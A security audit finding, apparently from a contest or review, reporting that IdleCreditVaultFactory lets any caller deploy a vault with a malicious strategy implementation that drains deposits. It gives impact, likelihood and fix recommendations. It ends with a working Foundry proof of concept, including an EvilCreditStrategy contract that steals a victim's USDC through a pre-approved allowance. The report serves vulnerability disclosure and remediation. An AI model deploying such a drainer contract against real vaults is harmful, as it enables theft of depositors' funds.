### Title
Unauthenticated factory callers can inject a malicious strategy implementation and drain all deposits - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`IdleCreditVaultFactory.deployCreditVault` is publicly callable and accepts `StrategyData.implementation` directly from the caller [1](#0-0) [2](#0-1) . The factory deploys a transparent proxy using that unauthenticated implementation and immediately delegatecalls `IdleCreditVault.initialize` [3](#0-2) . Because there is no implementation allowlist or bytecode-hash validation, an attacker can provide a malicious `IdleCreditVault` implementation.

### Finding Description
The deployed credit vault grants unlimited underlying-token and strategy-token allowances to the strategy during initialization [4](#0-3) . On every deposit, the credit vault first receives the depositor’s underlying tokens and then invokes `strategy.deposit(_amount)` [5](#0-4) .

A malicious strategy implementation can therefore wait for `deposit`, call `underlyingToken.transferFrom(msg.sender, attacker, balance)` where `msg.sender` is the credit vault, and consume the pre-approved allowance. The attacker does not need to become owner, manager, borrower, or guardian; deploying a factory-created vault with attacker-controlled strategy bytecode is sufficient. The injected implementation can retain all expected `IdleCreditVault` functions and owner-transfer behavior while overriding only `deposit`.

### Impact Explanation
Every underlying token deposited into the maliciously deployed credit vault can be transferred directly to the attacker during `deposit`. Depositors receive tranche tokens whose backing has already been removed, resulting in theft of up to 100% of deposits made through that factory-created vault. Existing vaults are not affected unless they were created through the same unsafe implementation-selection path.

### Likelihood Explanation
The attacker transaction is permissionless: call `deployCreditVault` with a malicious `strategyData.implementation`, then induce deposits into the deployed vault through ordinary integrations or by relying on the factory deployment event as evidence of legitimacy. The exploit requires victim deposits after deployment, but no privileged-role compromise, oracle manipulation, or protocol-owned seed capital.

### Recommendation
Do not accept arbitrary implementation addresses from deployment callers. Maintain an owner-controlled allowlist of approved implementation bytecode hashes or addresses for the credit vault, strategy, queue, programmable borrower, and escrow contracts. Alternatively, restrict factory deployment to a trusted treasury/operator and explicitly document that emitted deployments are not endorsements when arbitrary implementations remain supported.

### Proof of Concept
The following Foundry PoC demonstrates that a malicious `IdleCreditVault` implementation can drain the underlying deposited into a factory-created credit vault through the unlimited strategy allowance.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../contracts/IdleCreditVaultFactory.sol";
import "../contracts/IdleCDOEpochVariant.sol";
import "../contracts/strategies/idle/IdleCreditVault.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract EvilCreditStrategy is IdleCreditVault {
    address public immutable thief;

    constructor(address _thief) {
        thief = _thief;
    }

    function deposit(uint256 _amount)
        external
        override
        returns (uint256)
    {
        IERC20Detailed underlying = IERC20Detailed(token);
        uint256 stealable = underlying.balanceOf(msg.sender);

        // IdleCDOCreditVault approved this strategy for unlimited underlying spend.
        if (stealable != 0) {
            underlying.transferFrom(msg.sender, thief, stealable);
        }

        return _amount;
    }
}

contract FactoryImplementationInjectionTest is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testInjectedStrategyDrainsDeposit() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address honestManager = makeAddr("manager");
        address honestBorrower = makeAddr("borrower");

        // Deploy the factory behind the same transparent-proxy pattern used in production.
        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(
                new TransparentUpgradeableProxy(
                    address(factoryImpl),
                    proxyAdmin,
                    abi.encodeWithSelector(
                        IdleCreditVaultFactory.initialize.selector,
                        treasury,
                        proxyAdmin
                    )
                )
            )
        );

        EvilCreditStrategy evilStrategy =
            new EvilCreditStrategy(attacker);
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImpl),
                limit: 1_000_000e6,
                underlying: USDC,
                apr: 0,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 days,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: treasury,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(evilStrategy),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "Honest Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.prank(attacker);
        vm.recordLogs();
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        (
            address creditVault,
            ,
            ,
            ,
            ,
        ) = abi.decode(
            logs[logs.length - 1].data,
            (address, address, address, address, address, address)
        );

        uint256 amount = 100_000e6;
        deal(USDC, victim, amount);

        vm.startPrank(victim);
        IERC20Detailed(USDC).approve(creditVault, amount);
        IdleCDOEpochVariant(creditVault).depositAA(amount);
        vm.stopPrank();

        assertEq(IERC20Detailed(USDC).balanceOf(attacker), amount);
        assertEq(IERC20Detailed(USDC).balanceOf(creditVault), 0);
        assertGt(
            IdleCDOEpochVariant(creditVault).AAtranche().balanceOf(victim),
            0
        );
    }
}
```
